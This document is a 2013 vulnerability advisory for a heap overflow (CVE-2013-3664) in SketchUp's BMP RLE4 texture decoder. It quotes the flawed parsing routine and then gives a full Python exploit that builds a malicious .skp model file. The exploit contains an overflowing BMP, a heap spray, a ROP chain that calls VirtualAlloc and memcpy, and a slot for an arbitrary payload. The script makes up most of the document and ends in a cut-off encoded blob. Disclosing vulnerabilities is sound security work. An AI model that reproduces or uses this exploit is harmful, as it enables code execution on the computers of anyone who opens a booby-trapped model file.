'''
Title: SketchUp BMP RLE4 Heap Overflow
Product: Trimble SketchUp
Advisory ID: BINA-20130521A
CVE ID: CVE-2013-3664
Class: Boundary Error Condition (Buffer Overflow)
Vulnerability class: Client side/ file format
Advisory: http://binamuse.com/advisories/BINA-20130521A.txt
Blog: http://blog.binamuse.com/2013/05/multiple-vulnerabilities-on-sketchup.html
Vendor notified on: 2013-04-18
Patch/Fix Released: 2013-05-21
Advisory Published: 2013-05-23
Author: Juan Pablo "El Lagarto" De Francesco <jpdefrancesco@binamuse.com>

Vulnerability Description
-----------------------------------------

The native SketchUp fileformat can handle textured 3D content. 
Sketchup can create realistic materials taken from image files such as
.jpg pictures taken with a digital camera. A number of this images can
be embedded into the main .skp file and loaded every time the 3D scene
is open.

The code parsing BMP/RLE4 images seem to be taken from http://www.paintlib
.de/paintlib/. The problematic function is "decodeRLE4" at plbmpdec.cpp, 
and looks like:

void PLBmpDecoder::decodeRLE4
    ( PLDataSource * pDataSrc,
      PLBmpBase * pBmp
    )
    // Decodes a compressed 16-color-bitmap.
{
  int y;                              // Current row

  PLBYTE * pSrc;
  PLBYTE * pDest;                       // Current destination.
  int    XSize = pBmp->GetWidth();  // Width of bitmap in pixels.
  PLBYTE   SrcByte;                     // Source byte cache.

  PLBYTE   RunLength;    // Length of current run.
  bool   bOdd;         // true if current run has odd length.

  bool   bEOL;         // true if end of line reached.
  bool   bEOF=false;   // true if end of file reached.

  PLBYTE * pLineBuf;     // Current line as uncompressed nibbles.
  PLBYTE * pBuf;         // Current position in pLineBuf.
  PLBYTE ** pLineArray = pBmp->GetLineArray();
                                   // Pointers to dest. lines.

  Trace (2, "Decoding RLE4-compressed bitmap.\n");

  // Allocate enough memory for DWORD alignment in original 4 bpp
  // bitmap.
  pLineBuf = new PLBYTE [XSize*4+28];

  for (y=0; y<pBmp->GetHeight() && !bEOF; y++)
  { // For each line...
    pBuf = pLineBuf;
    bEOL=false;
    while (!bEOL)
    { // For each packet do
      pSrc = pDataSrc->Read1Byte();
      RunLength = *pSrc;
      if (RunLength==0)
      { // Literal or escape.
        pSrc = pDataSrc->Read1Byte();
        RunLength = *pSrc;
        switch (RunLength)
        {
          case 0: // End of line escape
            bEOL = true;
            break;
          case 1: // End of file escape
            bEOF = true;
            bEOL = true;
            break;
          case 2: // Delta escape.
            // I have never seen a file using this.
            delete [] pLineBuf;
            raiseError (PL_ERRFORMAT_NOT_SUPPORTED,
                        "Encountered delta escape.");
            break;
          default:
            // Literal packet
            bOdd = (RunLength & 1);
            RunLength /= 2; // Convert pixels to bytes.
            for (int i=0; i<RunLength; i++)
            { // For each source byte...
              pSrc = pDataSrc->Read1Byte();
              decode2Nibbles (pBuf, *pSrc);
              pBuf += 2;
            }
            if (bOdd)
            { // Odd length packet -> one nibble left over
              pSrc = pDataSrc->Read1Byte();
              *pBuf = (*(pSrc))>>4;
              pBuf++;
            }
            // Word alignment at end of literal packet.
            if ((RunLength + bOdd) & 1) pDataSrc->Skip(1);
        }
      }
      else
      { // Encoded packet:
        // RunLength 4 bpp pixels with 2 alternating
        // values.
        pSrc = pDataSrc->Read1Byte();
        SrcByte = *pSrc;
        for (int i=0; i<RunLength/2; i++)
        {
          decode2Nibbles (pBuf, SrcByte);
          pBuf += 2;
        }
        if (RunLength & 1)
        {
          *pBuf = (*(pSrc))>>4;
          pBuf++;
        }
      }
    }
    pDest = pLineArray[pBmp->GetHeight()-y-1];
    memcpy (pDest, pLineBuf, XSize);
  }
  delete [] pLineBuf;
}


Note that the for-loop inside the 'Encoded packet' branch decode/copy
two nibbles to pBuf every time, executing this RunLength/2 times. And
because there is no check about the pBuf's length before advancing the
pointer two positions, a heap overflow (pBuf based) may arise.

The pBuf is initialized to pLineBuf wich is a fresh allocated buffer
of size XSize*4+28, being XSize the BMP's width (controlled value). So
we can allocate almost any buffer size and then write and overflow it
with words like 0x0X0Y (X,Y controlled nibble values).

Vulnerability WorkAround (if possible)
-----------------------------------------
None
'''

import struct
import sys

def mkBMP(payload=''):
    ''' Generates the overflowding BMP '''
    bmp = ''
    #getInfoHeader
    bfType = 0x4d42
    assert bfType in [0x4d42,0x4349,0x5043,0x4943,0x5043] #0x4142: not supp
    bmp += struct.pack('<H', bfType)

    bfSize = 0
    bfOffBits = 0
    #bmp += struct.pack('<L', 0x41414141)# bfSize)
    #bmp += struct.pack('<H', 0x4141) #Reserved1
    bmp += 'AA'
    bmp += struct.pack('<L', 0x121064ad) # -> pop ret

    bmp += struct.pack('<H', 0) #Reserved2
    bmp += struct.pack('<L', bfOffBits)


    biSize = 40
    assert not biSize in [0x12]
    bmp += struct.pack('<L', biSize)


    biHeight = 1
    biWidth = 5 # Size of alloc to be overflowed = biWidth*4+28 = 0x30
    biPlanes = 1
    biBitCount = 4
    biCompression = 2 #BI_RLE4=2
    biSizeImage = 0
    biXPelsPerMeter = 0
    biYPelsPerMeter = 0
    biClrUsed = 200
    biClrImportant = 0

    bmp += struct.pack('<L', biWidth)
    bmp += struct.pack('<L', biHeight)
    bmp += struct.pack('<H', biPlanes)
    bmp += struct.pack('<H', biBitCount)
    bmp += struct.pack('<L', biCompression)
    bmp += struct.pack('<L', biSizeImage)
    bmp += struct.pack('<L', biXPelsPerMeter)
    bmp += struct.pack('<L', biYPelsPerMeter)
    bmp += struct.pack('<L', biClrUsed)
    bmp += struct.pack('<L', biClrImportant)
    bmp += 'A'*(biSize-40) #pad

    numColors=biClrUsed
    if numColors == 0 or biBitCount < 8:
        numColors = 1<<biBitCount;

    #The pallete ..
    pal = "\x01\x02\x03\x04"*numColors
    bmp += pal


    #The RLE Bitmap..

    bmp += chr(0x80) #RunLenght
    bmp += chr(0xCC) #SrcByte
    bmp += '\x00\x01' #EOF
    return bmp


class SKP():
    ''' Class to construct basic sketchup blocks (Mainly a CArchive serialization)'''
    def __init__(self, bin=""):
        self.bin=list(bin)
        self.pos=0
    def __str__(self):
        return "".join(self.bin)

    #WRITE
    def produce(self, s):
        self.bin += list(s)
        self.pos+=len(s)
    def producehex(self, s):
        self.produce(s.decode('hex'))

    def writeString(self,s, bUnicode=False):
        #assert type(s) == str, "Unicode not supported yet, what for?"
        nLength = len(s)
        if bUnicode:
            # Tag Unicode strings
            self.writeByte(0xff)
            self.writeLE16(0xfffe)
            assert nLength%2 == 0
            nLength = nLength/2

        if nLength < 255:
            self.writeByte(nLength)
        elif nLength < 0xfffe:
            self.writeByte(0xff)
            self.writeLE16(nLength)
        elif nLength < 0xffffffff:
            self.writeByte(0xff)
            self.writeLE16(0xffff)
            self.writeLE32(nLength)
        else:
            self.writeByte(0xff)
            self.writeLE16(0xffff)
            self.writeLE32(0xffffffff)
            self.writeLE64(nLength)
        self.produce(s)

    def writeLE32(self,val):
        return self.produce(struct.pack("<L",val))
    def writeBE32(self,val):
        return self.produce(struct.pack(">L",val))
    def writeLE16(self,val):
        return self.produce(struct.pack("<H",val))
    def writeBE16(self,val):
        return self.produce(struct.pack(">H",val))
    def writeByte(self,val):
        return self.produce(struct.pack("B",val))
    def writeDouble(self,val):
        return self.produce(struct.pack("d",val))

    def writeValue(self,val):
        if type(val) == str:
            self.produce('\x0a')
            self.writeString(val)
        elif type(val) == bool:
            self.produce('\x07')
            self.writeByte(val)
        elif type(val) == int:
            self.produce('\x04')
            self.writeLE32(val)

def mkSKP(payload = None):
    skp = SKP()
    #magic
    skp.writeString("SketchUp Model")

    #version
    skp.writeString("{8.0.4811}") 

    #about?timestamp?
    #assert major*1000000+minor*1000+build >= 1046 (all capped to a max of 999)
    skp.writeLE32(0)
    skp.writeLE16(0)
    skp.writeLE16(0)
    skp.produce("A"*8)


    #UNKNOWN
    skp.writeString("UNKNOWN")
    skp.writeLE32(0x0)

    # CVersionMap
    skp.produce('\xff\xff\x00\x00')
    obj_name="CVersionMap"
    skp.writeLE16(len(obj_name))
    skp.produce(obj_name)
    skp.writeString('CText')
    skp.writeLE32(0x00000009)
    skp.writeString('CWatermarkManager')
    skp.writeLE32(0x00000002)
    skp.writeString('CDimensionStyle')
    skp.writeLE32(0x00000004)
    skp.writeString('CSkpStyle')
    skp.writeLE32(0x00000001)
    skp.writeString('CPageList')
    skp.writeLE32(0x00000001)
    skp.writeString('CViewPage')
    skp.writeLE32(0x0000000c)
    skp.writeString('CShadowInfo')
    skp.writeLE32(0x00000007)
    skp.writeString('CDimensionLinear')
    skp.writeLE32(0x00000006)
    skp.writeString('CComponentInstance')
    skp.writeLE32(0x00000004)
    skp.writeString('CDefinitionList')
    skp.writeLE32(0x00000000)
    skp.writeString('CDimensionRadial')
    skp.writeLE32(0x00000002)
    skp.writeString('CDimension')
    skp.writeLE32(0x00000001)
    skp.writeString('CArcCurve')
    skp.writeLE32(0x00000001)
    skp.writeString('CImage')
    skp.writeLE32(0x00000001)
    skp.writeString('CTexture')
    skp.writeLE32(0x00000006)
    skp.writeString('CLayer')
    skp.writeLE32(0x00000002)
    skp.writeString('CSectionPlane')
    skp.writeLE32(0x00000002)
    skp.writeString('CRelationship')
    skp.writeLE32(0x00000000)
    skp.writeString('CDrawingElement')
    skp.writeLE32(0x00000009)
    skp.writeString('CComponentDefinition')
    skp.writeLE32(0x0000000a)
    skp.writeString('CDib')
    skp.writeLE32(0x00000003)
    skp.writeString('CWatermark')
    skp.writeLE32(0x00000001)
    skp.writeString('CBackgroundImage')
    skp.writeLE32(0x0000000a)
    skp.writeString('CComponent')
    skp.writeLE32(0x0000000b)
    skp.writeString('CSketchCS')
    skp.writeLE32(0x00000000)
    skp.writeString('CConstructionGeometry')
    skp.writeLE32(0x00000000)
    skp.writeString('CSketchUpPage')
    skp.writeLE32(0x00000001)
    skp.writeString('CGroup')
    skp.writeLE32(0x00000001)
    skp.writeString('CRenderingOptions')
    skp.writeLE32(0x00000024)
    skp.writeString('CMaterial')
    skp.writeLE32(0x0000000c)
    skp.writeString('CFaceTextureCoords')
    skp.writeLE32(0x00000004)
    skp.writeString('CAttributeContainer')
    skp.writeLE32(0x00000000)
    skp.writeString('CSkFont')
    skp.writeLE32(0x00000001)
    skp.writeString('CSketchUpModel')
    skp.writeLE32(0x00000016)
    skp.writeString('CEntity')
    skp.writeLE32(0x00000003)
    skp.writeString('CSkpStyleManager')
    skp.writeLE32(0x00000002)
    skp.writeString('CAttribute')
    skp.writeLE32(0x00000000)
    skp.writeString('CMaterialManager')
    skp.writeLE32(0x00000004)
    skp.writeString('CAttributeNamed')
    skp.writeLE32(0x00000001)
    skp.writeString('CComponentBehavior')
    skp.writeLE32(0x00000005)
    skp.writeString('CTextStyle')
    skp.writeLE32(0x00000005)
    skp.writeString('CCamera')
    skp.writeLE32(0x00000005)
    skp.writeString('CEdgeUse')
    skp.writeLE32(0x00000001)
    skp.writeString('CConstructionPoint')
    skp.writeLE32(0x00000000)
    skp.writeString('CLayerManager')
    skp.writeLE32(0x00000004)
    skp.writeString('CFace')
    skp.writeLE32(0x00000003)
    skp.writeString('CFontManager')
    skp.writeLE32(0x00000000)
    skp.writeString('CConstructionLine')
    skp.writeLE32(0x00000001)
    skp.writeString('CPolyline3d')
    skp.writeLE32(0x00000000)
    skp.writeString('CLoop')
    skp.writeLE32(0x00000001)
    skp.writeString('CCurve')
    skp.writeLE32(0x00000004)
    skp.writeString('CThumbnail')
    skp.writeLE32(0x00000001)
    skp.writeString('CVertex')
    skp.writeLE32(0x00000000)
    skp.writeString('CRelationshipMap')
    skp.writeLE32(0x00000000)
    skp.writeString('CEdge')
    skp.writeLE32(0x00000002)
    #Stackoverflow if big iteration NX
    #for i in range (0,100000): 
    #    skp.writeString("CEdge") #CArchive Name?
    #    skp.writeLE32(0x2)  #CArchive Id?
    skp.writeString("End-Of-Version-Map")

    #Unknown
    skp.writeLE32(0x0)  #CArchive Id?
    skp.writeLE32(0x1)  #CArchive Id?
    skp.writeLE32(1200)  #CArchive Id?
    skp.writeLE32(0x1)  #CArchive Id?

    #CDib
    skp.produce('\xff\xff\x03\x00')
    obj_name="CDib"
    skp.writeLE16(len(obj_name))
    skp.produce(obj_name)
    skp.writeLE32(0x4)  #CArchive Id?
    #This will be parsed and shown in the Windows Explorer preview
    #Yes! You may crash the explorer if the buggy BMP is put here.
    thumbnail = ""
    skp.writeLE32(len(thumbnail))  #CArchive Id?
    skp.produce(thumbnail)
    skp.producehex


    #CAttributeContainer
    skp.producehex('FFFF0000')
    obj_name="CAttributeContainer"
    skp.writeLE16(len(obj_name))
    skp.produce(obj_name)
    skp.writeLE16(0)

    #CAttributeNamed
    skp.producehex('FFFF0100')
    obj_name="CAttributeNamed"
    skp.writeLE16(len(obj_name))
    skp.produce(obj_name)
    skp.writeLE16(0)
    skp.writeLE16(0)
    skp.writeLE16(0)
    skp.writeString('ModelProperties') #beginlist
    skp.writeString('Description') #item1
    skp.writeValue('No description')
    skp.writeString('IsDynamic') #Item2
    skp.writeValue(False)
    skp.writeString('Name') #item3
    skp.writeValue('No name')



    spray = ""
    spray += "Z"*(0xC0C-0x20) #align to 0x0C0C0C0C (-0x20 heap's header)
    spray += struct.pack('<L', 0x100086B2) # ADD ESP,70 # RET
    spray += "B"*0x6C
    spray += struct.pack('<L', 0x1000180C) # XCHG EAX, ESP # RET


    #Unicode-Null Free ROP Chain (LoadLibrary->GetProcAddress->VirtualAlloc->memcpy) 
    rop = ""
    rop += struct.pack('<L', 0x10008A5E) #POP ESI # RET
    rop += struct.pack('<L', 0x101B6084) #ESI -> [0x101B6084]=&LoadLibrary
    rop += struct.pack('<L', 0x1018E11D) #JMP [ESI]  (LoadLibrary)
    rop += struct.pack('<L', 0x10001E3B) #(ret from LoadLibrary) #POP EDI # POP ESI # RET
    rop += struct.pack('<L', 0x10252D0A) #"Kernel32.dll"
    rop += struct.pack('<L', 0x1000F76D) #EDI -> ADD ESP,1C # RET
    rop += struct.pack('<L', 0x101B6090) #ESI -> [0x101B6084]=&GetProcAddress
    rop += struct.pack('<L', 0x10091E20) #MOV [ESP+20], EAX # CALL EDI
    rop += struct.pack('<L', 0xFFFFFFFF)*6 #PAD
    rop += struct.pack('<L', 0x1018E11D) #JMP [ESI]  (GetProcAddress)
    rop += struct.pack('<L', 0x100116FE) #(ret from GetProcAddress) #XCHG EAX,EBP # RET
    rop += struct.pack('<L', 0xFFFFFFFF) #(overwritten) Kernel32.dll Handle
    rop += struct.pack('<L', 0x0C0C0D94) #"VirtualAlloc"
    rop += struct.pack('<L', 0x10001E12) #XOR EAX,EAX # POP ESI # RET
    rop += struct.pack('<L', 0x100BE432) #ESI -> #ADD ESP,4 # RET
    rop += struct.pack('<L', 0x10057F2A) #MOV [ESP+50], EAX # CALL ESI
    rop += struct.pack('<L', 0x10057F2A) #MOV [ESP+50], EAX # CALL ESI
    rop += struct.pack('<L', 0x10057F2A) #MOV [ESP+50], EAX # CALL ESI
    rop += struct.pack('<L', 0x10057F2A) #MOV [ESP+50], EAX # CALL ESI
    rop += struct.pack('<L', 0x101A9577) #POP EAX # RET
    rop += struct.pack('<L', 0x0C0C0D28) #EAX -> &dwSize
    rop += struct.pack('<L', 0x101ABB39) #POP ECX # RET
    rop += struct.pack('<L', 0xFFFFC000) #ECX -> CX=dwSize=0xC000
    rop += struct.pack('<L', 0x100FEA93) #MOV WORD PTR [EAX], CX # RET
    rop += struct.pack('<L', 0x1012801D) #ADD EAX,4 # RET -> EAX = &flAllocationType
    rop += struct.pack('<L', 0x101ABB39) #POP ECX # RET
    rop += struct.pack('<L', 0xFFFF1000) #ECX -> CX=flAllocationType=MEM_COMMIT
    rop += struct.pack('<L', 0x100FEA93) #MOV WORD PTR [EAX], CX # RET
    rop += struct.pack('<L', 0x1012801D) #ADD EAX,4 # RET -> EAX = &flProtect
    rop += struct.pack('<L', 0x101ABB39) #POP ECX # RET
    rop += struct.pack('<L', 0xFFFF0040) #ECX -> CX=flProtect=EXECUTE_READWRITE
    rop += struct.pack('<L', 0x100FEA93) #MOV WORD PTR [EAX], CX # RET
    rop += struct.pack('<L', 0x100BE432) #ADD ESP,4 # RET
    rop += struct.pack('<L', 0xFFFFFFFF) #PAD
    rop += struct.pack('<L', 0x1018494D) #JMP EBP
    rop += struct.pack('<L', 0x100116FE) #(ret from VirtualAlloc) #XCHG EAX,EBP # RET
    rop += struct.pack('<L', 0xFFFFFFFF) #(overwritten) lpAddress=NULL
    rop += struct.pack('<L', 0xFFFFFFFF) #(overwritten) dwSize=0xC000
    rop += struct.pack('<L', 0xFFFFFFFF) #(overwritten) flAllocationType=MEM_COMMIT
    rop += struct.pack('<L', 0xFFFFFFFF) #(overwritten) flProtect=EXECUTE_READWRITE


    rop += struct.pack('<L', 0x10001E12) #XOR EAX,EAX # POP ESI # RET
    rop += struct.pack('<L', 0x10012DB3) #ESI -> #POP EBX # POP ECX # RET
    rop += struct.pack('<L', 0x10057F2A) #MOV [ESP+50], EAX # CALL ESI
    rop += struct.pack('<L', 0xFFFFC000) #ECX -> CX=size=0xC000
    rop += struct.pack('<L', 0x101A9577) #POP EAX # RET
    rop += struct.pack('<L', 0x0C0C0D90) #EAX -> &size
    rop += struct.pack('<L', 0x100FEA93) #MOV WORD PTR [EAX], CX # RET
    rop += struct.pack('<L', 0x100116FE) #XCHG EAX,EBP # RET

    rop += struct.pack('<L', 0x1003CDC2) #POP ESI # POP EBX #POP EDI # RET
    rop += struct.pack('<L', 0xFFFFFFFF)*2 #PAD
    rop += struct.pack('<L', 0x1000F76D) #EDI -> ADD ESP,1C # RET
    rop += struct.pack('<L', 0x10091E20) #MOV [ESP+20], EAX # CALL EDI
    rop += struct.pack('<L', 0xFFFFFFFF)*6 #PAD
    rop += struct.pack('<L', 0x101A8AA8) #JMP memcpy
    rop += struct.pack('<L', 0x1000431E) #(ret from memcpy) # JMP EAX
    rop += struct.pack('<L', 0xFFFFFFFF) #(overwritten) dst
    rop += struct.pack('<L', 0x0C0C2000) #src
    rop += struct.pack('<L', 0xFFFFFFFF) #(overwritten)size=0xC000


    rop += "VirtualAlloc\x00"



    spray += rop
    assert len(spray) <= 0x2000
    spray += "\x90"*(0x2000-len(spray))

    spray += payload + "\xCC"
    assert len(spray) <= 0x10000
    spray += "Z"*(0x10000-len(spray))



    skp.writeString(spray*0x100, bUnicode=True) #0x1000000/0x10000=0x100
    skp.writeValue("W"*0x10)
    skp.writeString((spray.replace("Z","Y"))*0x100, bUnicode=True)
    skp.writeValue("X"*0x100)
    skp.writeString((spray.replace("Z","X"))*0x100, bUnicode=True)
    skp.writeValue("Y"*0x100)

    #This is an attempt to pack the memory layout
    #Allocs 2048 times a chunk of 1 bytes
    #Allocs 1024 times a chunk of 2 bytes
    #Allocs 512 times a chunk of 4 bytes
    #Allocs 256 times a chunk of 8 bytes
    #Allocs 128 times a chunk of 16 bytes
    #Allocs 64 times a chunk of 32 bytes
    #Allocs 32 times a chunk of 64 bytes
    #Allocs 16 times a chunk of 128 bytes
    #Allocs 8 times a chunk of 256 bytes
    #Further analisys will be needed here to make it resistant to different conditions
    #This plays well when the overfloding buffer is 85bytes length and it is the first
    #opened file in a fresh sketchup (by command line or doubleclick)
    co=0
    for _r in range(12,512):
        size = size = _r-9
        for tt in xrange(0,100):
            skp.writeString(("%%0%dd"%size)%co) #item3
            skp.writeValue("A"*_r)
            co+=1


    skp.writeString('') #endlist
    skp.producehex('000000000000038004000000')
    #Used for background image
    background = "" #file("background.png","rb").read()
    skp.writeLE32(len(background))
    skp.produce(background)

    skp.producehex('FFFF0500')
    obj_name="CCamera"
    skp.writeLE16(len(obj_name))
    skp.produce(obj_name) #07004343616D657261
    skp.producehex

    skp.writeString('GSU_ContributorsInfo') #beginlist
    skp.writeString('LastModifiedByKey')
    skp.writeValue('')
    skp.writeString('VersionKey')
    skp.writeValue(1000)
    skp.writeString('') #endlist

    skp.producehex('010000000000000000010100000000000000')

    skp.writeLE32(9)  #Number of materials contained in CMaterial
    skp.producehex('FFFF0C00')
    obj_name="CMaterial"
    skp.writeLE16(len(obj_name))
    skp.produce(obj_name) #07004343616D657261
    skp.writeLE16(0)
    skp.writeString('black')
    skp.writeLE16(0)
    skp.writeByte(0) #R
    skp.writeByte(0) #G
    skp.writeByte(0) #B
    skp.writeByte(0xff) #A
    skp.writeString('Unused?')
    skp.producehex('0000000000000000000000000000E03F000E800000')
    skp.writeString('<Beige>1')
    skp.producehex('0000D3BD90FFFFFEFF000000000000000000000000000000E03F000E800000')
    skp.writeString('[Color_B24]')
    skp.producehex('000033231EFFFFFEFF000000000000000000000000000000F03F000E800000')
    skp.writeString('<LightGray>')
    skp.producehex('0000A9A9A9FFFFFEFF000000000000000000000000000000E03F000E800000')
    skp.writeString('[0135_DarkGray]')
    skp.producehex('0000515151FFFFFEFF000000000000000000000000000000E03F000E800000')
    skp.writeString('96,96,96')
    skp.producehex('0000606060FFFFFEFF000000000000000000000000000000E03F000E800000')
    skp.writeString('jean blue')
    skp.producehex('0000242F42FFFFFEFF000000000000000000000000000000E03F000E800000')
    skp.writeString('<Charcoal>')
    skp.producehex('0000232323FFFFFEFF000000000000000000000000000000E03F000E800000')
    skp.writeString('*1')
    skp.producehex('010000038002000000')

    #Generates the overflowding BMP
    material = mkBMP(payload)
    skp.writeLE32(len(material))  #CArchive Id?
    skp.produce(material)
    skp.writeDouble(1.0)
    skp.writeDouble(1.0)
    skp.writeString('file.bmp')
    skp.producehex('FFFFFFFF00FFFFFFFFFFFEFF000100000000000000000000000000E03F0017000000')

    skp.producehex('01000000')

    #Reversing stopped.
    skp.produce('''eJzUfQlcTF/4952tfS8VknZp065t6mrfF4qUdqW070kYFJUoa9lDQiqRJXSVFBFSZEtkF6KQotR7
                5945EzUzv//7ft7P+/m8+ajv3HO+z/Oc5zznOcu9MzM2RoS4ICvnoBWhCRA0NjrG5QwFQSugUCgB
                0oYg7JLA+KUA6J9iwpin5xhaA2L5Mw0i0AWM8UESkJVVbHRcbExoTJJ1aFhETERSRGwMhQZB3DS8
                LipEbCkqOAYVHw1FQCGoqiAoCf2XgL4KhpJRFAol0usJBqClsVAU+j8BqxWC/qOXJUJ8aDHZGXKA
                FkCe9Koi/1YNw/5Go6+DUJGh6F86gWLFrIK+EmdNScZIyah9EagluCYuupb5qDZXyA7z079UTlqE
                /q0aC8WhUiPQvzEM2S4qqMwEzNdUyBgyhJQhXchqAlJB9YeidaLQOrpof+AlOijS/QeroFaGQkvR
                WjqQAaTHKNNjMugI1xeK/otB681Fa06Wpo/Vm9xSzm4RC0BV0/snBOvL8ZZOdBG/NctquLtAR9CD
                IgWLv0RGORceQX0WaEWpACgcrZKIyo5GC+kVk9C/dFMDME300hSMSBfABUIVDyucyrYapkEQtzoR
                lUvXsBStFIb+p7uX3gYRej/QfaaJ/jdCf+ugv+XQ3zqQCepDPYb3ojA/L0OFhE/0Ht1vVpA9ZIMG
                MR7CeKNDMbcEYS2ZFPOukBtKs6EThFkR6DgBaw0jxidXYT04xBeg9iWil2KgWehfOdSocJSSgJLl
                oH9CWpSTUHz4TB4HLI391wIelwkV2On6/20QsWw756FECWAkyFDcl+OdQx8+44UTfYjGB16AD0e6
                h0LQInqajWTb9TOtmFXksFEkh+JwTNsytJIcSliB/k78KyDGk4IWY9hOVPWvCm568bga3CkTKfSh
                hrtJByIzBisLyf/huXHTsKCi97wGNP6b7j/WWYpe/eG4o+XQy/RxEIQ5IBT9H4x1oBxaOQxzVDjm
                nAWoUfTkQ3eZFypODkuCKVjT6ZEajQVJEsYIxXpHizG66Gx62XK03gpMVxKmeSmmTQ7VR2/yCkbj
                6Z2hgXVDHGY4kImHFN2aKMaI0MCspsuh20IvT2Hw8dYEY2klEmXEopq0IDP0SgJkzvy7GL2ejHUy
                7od/gwG0e9zPwCMTM8jfAROMhdB4NwJ7YjEN4QzPpmIdG/6XFgesnaHY4A5htBhP81jg8UwcWOz6
                nMx+OHH/G2D0CmYLsC5VhRT+Sn0KqDQFaKJs/Co9n2gwRj/4i5fgOUQDyxr4b/w6PWeMM/Sx67Mh
                sMT6a7Uk5ImFQxwWMkFoh8aibqK7hT6Y6S2zwpy2AjNcwBLruygshugeVUUb4IYL5rbCymKwmMGr
                k7xQqfMwKdao7AS0+WRNXK2wNZZO6V5ZhipOQisGMeMoEeLG5jdrbIzEYYN9BToCY7HeDsdLRf8t
                dUOZ81AcBdlifUkfgtwEtJ7E5Hp22ByWjMWwO3Y9Bq2P1Rb6t/bfTmFYJWKDvl6GybdiTOAsavE4
                Y5FDd10y5i2uqeSFQppEa5geIM7MZpPdcX/wOmOxuuxvxiwdnnKZ+T71aDHfeOPnYdXoE//fqw4e
                T8gHbVsY+i8RCy5GoQydLe6FXVyANdkWk4S7ChiOu52bVXxI2KG1vNC8aIUZ+Pc6Gl/U/BUrAq6M
                IAejIRFyQn+vgPjpC3gsndphwwu3n94u3LIEVMrSybWn0pc+hmgUz0X/0iPaGP09F41y+jV99K8e
                Gt1G6D999Io2+lsHk7nwn2UdLpP8gYQ1B9tK/NU8fj3IGlqEBWcolrGSMYPo8eyCLcvoedYBrYPN
                ZAaYtwzR9uuj/5ai/7RRG/RRu+jXjbC/YaiFIdhCzRgtDUJr0202wPPE+KaGQJiwy6G/nkr7v713
                UsB+vyXQ909EiAJZ2SxdFgpBwkwDxlAiN2S1MDQhKTQNgur38gZ/vSkJ42xV5JTw7tH8XTawMm1y
                2RwN86xrCbbw2BiZvvezSk5IQUVDqKMhRdrfOmZBdHqRWWCPVbQUTqfpIdQ1mnPtptnBsyfUptct
                +OmtvEGSURdSQjoDddaP8drAKhCr2lBndYi3GpBsgHjl7yUdfGsNa0Kq9FIi1kwSvfW2QSGhk9xP
                6zXDQV/djSzPL11NQ/jr+kUIvvEk0KnOsbFx9F6iv+TB/eiVGDqxqXRzaPoas/xTpzKMN0Eq/KVv
                naywxnwIP194T6cKNEwDGVs2o3VtnDWMGYqNWX3IgMZKqnfZy8FVYtKMRuogvQ5CoQduWsHG9Naw
                Iz1eZrJJaS8wZQ6yptoyeOmIFUyFmArZcosESwdraqYz++v+Od0Bqqw1DKPJgz3JIdFmY+oMhkIj
                JsmaE8la/ZoK9xQ5Zv99muaYReWxhu04kTJlD2xuV5RnaNJF+OctXWP2zAp25ES6XTS9SaVAnqmp
                ZeyC+enDVrALJ1L9zy3ttk+BJm2k92pq7b54a9idnfcWYDTnRZk7tm4bN/B+Y5ipQ5k1bMK6jxfi
                obxTIsUkheEKSBqJ13w3S/gGW9JijMSjNjCy0k6WaSB/EI9fVitb0hKMJG2Seoi7itG9kCGy+evz
                XL8mtqQANL1hRfSfuehizgKdEWzR1OiMTjvz0RnCG/KF/NHENNl/2RTaALl1JkMThIgfy3JffgjG
                xkPRtV9VlN3MMkjMeXfGUAiMjwcKxKo7Joo7oBI7uOEbDNPn/H9ru2PzNIuh5LadHFwP/CVCJT3i
                duWbhRtk/0+ZEjUwrbzuaqw5PFHOUnRdzUp2+MyhYs0m+Xqcr49QA9VqOp7gg//DQtjwi7QCo0wd
                kY8+n2igxRj89LSpgwIRprjRMfrP5Vq8el/dpVltVkfPf8df0xyp9Fp6NHpOYh23VWdi78sY8eDq
                aGZUuZFZT2P7nTBT+uBwt3VVjDJIDkkPTd7mqOOMmyKI/icksJHa7Vf/6+5yMoMpTTU61VF8ZK0T
                nIwuftiS6h9vvA91/arDSRrIOqlmq4s9jnA6JxJtbXt8g/xzBmkWImKi/rDF3RFexYkEJYXNGbj/
                0gInKSJFwq3TJH45wDR2pPU4jabWUMYzxqApIQ9SutxIWx3hVAhiRdqAkeRWiBBmFnExYkUVKT/g
                dYAi7sSOlINrWl09fYGkAIMkQm3e3NXbXMCWlIe7Yj6PskalIIMEUbUFWtLvXmVLolOKHSuej2UK
                MSkxW+vWWf9xgvM5uvwfkiIi8HQ2D3maM7yNHWkne5qJMzvzinBHND5Z37EVtEkbiVIUSGlaypaE
                6dkTsF11HT9OQdP3yJTOKCTFGd4LcQjY4iL9Uz8dGCQ0D0u4/7jqkeoMH+BEgpO5kWd2PAySNLIj
                RPKKl7YzfAifOFU4cetp2le+XCQxG6at6SXjM+IEl0BHOSh8c26ov/YPIwA1kExP7x/a953g45xI
                9XFvKMW/Bi1A0zLXeypV3nKCT3Ii0XTnbbV6PMjUpLo4MlzstRNcydG86ec1l//5aQHaVO7XvGCA
                6Ayf5kjSFrTLaBhgaqpKK6k7L+oMn+VEgtwWLryn8YNBUkFKFiYWX5niDF/g6IidR1qVePuZjthh
                5ZV3U8gZvsSRdGb2jKHqjwySPuKseFrdR8AZRjiap3vdS6q/e1xT+pZrmiLOcD1H0mtnFfGND5ne
                A226xpEksiBTfF4lkyRTE12warYzfJ0jqW+zpKVoDSNnzkEaXwiv+2nnDN/kSLJvI14j1TMT7b4X
                GXO++TjDtzmSdhy07ykcJyUZu5+zi3OGWzmSPhi6vu4/zTTvh7by8vxDznA7R1J98c/i19W4I9CV
                b5VE0kW9Tme4gx3pMYN2TWOvzk2m/x4cKT1z+ZczfJR1funEB0evtm6SQA+TVPNwc9DbfBd2JIxS
                TunwFvvMjIh7W48+Ha1xgZ+zM+8lThN5p299F9DmII8rz5q7/+aoCSqR4NJz+MjU9Fm3Mnumuiv8
                hp2m93ic76tOyCS9YsZ599t1lftoruw0fcR1Pa8pPPC+jknq29LtlfKcLakXJ9ncm680/zGje7UQ
                R7Xtq/XV3Ti2ybV236u8XgbFCBGb4zWzOcIN7mPXpu84remke0TpIDOQTCReains56ip/k/wgzvy
                UD0Iox3u/Uf0mt3gn+w0/cJoIt8+xu+WZKx30G2Qvi+c3NvLVtMIvkiyWXdDYwU3k7Teq9G5mMed
                k3n3GtR3zHXmrweOMBcotT8j7w6PcRoaclsN5QrSBOpBROjq5W7WV3KHiQRO4+ms4SqdAkEGyRB5
